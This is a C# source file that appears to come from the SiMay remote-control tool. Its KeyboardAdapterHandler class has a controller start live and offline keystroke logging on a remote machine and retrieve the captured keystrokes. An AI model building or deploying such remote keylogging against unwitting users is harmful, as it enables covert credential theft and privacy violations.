using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SiMay.Core;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Net.SessionProvider;

namespace SiMay.RemoteControlsCore.HandlerAdapters
{
    public class KeyboardAdapterHandler : ApplicationAdapterHandler
    {
        public event Action<KeyboardAdapterHandler, string> OnKeyboardDataEventHandler;

        public event Action<KeyboardAdapterHandler, string> OnOffLineKeyboradEventHandler;

        [PacketHandler(MessageHead.C_KEYBOARD_DATA)]
        private void KeyBoardDataHandler(SessionProviderContext session)
        {
            var text = GetMessage(session).ToUnicodeString();
            this.OnKeyboardDataEventHandler?.Invoke(this, text);
        }

        [PacketHandler(MessageHead.C_KEYBOARD_OFFLINEFILE)]
        private void OffLinesDataHandler(SessionProviderContext session)
        {
            var text = GetMessage(session).ToUnicodeString();
            this.OnOffLineKeyboradEventHandler?.Invoke(this, text);
        }

        public void StartGetKeyorad()
        {
            SendTo(CurrentSession, MessageHead.S_KEYBOARD_ONOPEN);
        }

        public void StartOffLineKeyboard()
        {
            SendTo(CurrentSession, MessageHead.S_KEYBOARD_OFFLINE);
        }

        public void GetOffLineKeyboardData()
        {
            SendTo(CurrentSession, MessageHead.S_KEYBOARD_GET_OFFLINEFILE);
        }
    }
}
